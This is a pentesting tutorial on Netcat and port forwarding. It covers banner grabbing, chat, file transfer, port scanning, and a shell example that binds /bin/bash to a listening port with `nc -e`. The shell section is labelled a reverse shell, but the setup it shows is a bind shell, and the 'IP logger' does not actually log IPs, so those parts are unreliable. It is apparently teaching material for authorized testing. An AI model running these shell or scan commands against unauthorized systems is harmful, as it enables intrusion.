# Swiss Army Knife for Pentesters

> **Focus:** using multi-purpose tools (like Netcat) to establish connections, scan networks, transfer files, and more during penetration tests.

---

## Table of Contents
1. [Port Forwarding](#1-port-forwarding)
2. [Swiss Army Knife Concept](#2-swiss-army-knife-concept)
3. [Netcat](#3-netcat)

---

## 1 – Port Forwarding

### What is Port Forwarding?
Port forwarding allows traffic from outside a network to reach a specific device inside a local network by configuring the router to forward incoming packets on a port to an internal IP and port.

**Why it matters:**  
Penetration testers often need to pivot or access services hidden behind NAT/firewalls.

### Example Scenario

```
+-----------------------+       +-------------------------+
|       Internet         | <---> |     Router (NAT)        |
+-----------------------+       +-------------------------+
                                      |
                                      | forwards port 2222 -> 192.168.0.10:22
                                      |
                            +-------------------+
                            | Local Network     |
                            | Device: 192.168.0.10|
                            | SSH server on :22 |
                            +-------------------+
```

By setting up port forwarding on the router, you make the internal SSH server accessible from the internet on port `2222`.

---

## 2 – Swiss Army Knife Concept

### Why "Swiss Army Knife"?
A Swiss Army Knife packs multiple tools into a single device.  
Similarly, certain pentesting utilities pack multiple networking features into a single binary.

### Swiss Army Knife for Pentesters
Tools like `netcat`, `ncat`, `socat`, `cryptcat`, and `sbd` allow you to:

Establish and receive connections  
Perform banner grabbing  
Set up simple chat sessions  
Transfer files over TCP/UDP  
Deploy basic honeypots  
Scan ports  
Execute remote commands

---

## 3 – Netcat

### About Netcat
Netcat (often installed as `nc`, `netcat`, or `nc.traditional`) is a minimalistic networking utility available by default on most Linux distros.  
There are also Windows binaries (`nc.exe`).

---

### Example: Connecting to a Service
Connect to an FTP server on port 21:

```bash
nc www.businesscorp.com.br 21
```

You’ll see the FTP banner, indicating a successful TCP handshake and service response.

---

### Chat Over Netcat
You can use Netcat to set up a rudimentary chat between two machines.

#### On the listener (192.168.0.10):
```bash
nc -l -p 4444
```

#### On the client:
```bash
nc 192.168.0.10 4444
```

Now anything typed will be sent across the connection.

---

### IP Logger Example
You can use Netcat to quickly identify connections (primitive logger).

#### On the server:
```bash
nc -l -p 5555 > connections.txt
```
Any incoming data will be saved into `connections.txt`.

---

### Transfer Files
#### Send a file
```bash
nc -l -p 6666 > received_file.txt
```
#### On the sender
```bash
nc 192.168.0.10 6666 < file_to_send.txt
```

---

### Reverse Shell (remote command execution)
#### Victim machine (listener for shell)
```bash
nc -l -p 7777 -e /bin/bash
```
#### Attacker connects:
```bash
nc 192.168.0.10 7777
```
> **Note:** The `-e` flag is disabled on many distributions for security reasons. Alternatives include using `/dev/tcp`.

---

### Quick Port Scanner
```bash
nc -zv 192.168.0.10 20-30
```
- `-z` = scan mode (no data sent)
- `-v` = verbose output

---

## Summary
Tools like Netcat embody the "Swiss Army Knife" concept: with a single small binary, you can explore, scan, connect, chat, transfer, and even pivot. As a pentester, mastering such tools greatly increases your flexibility in the field.


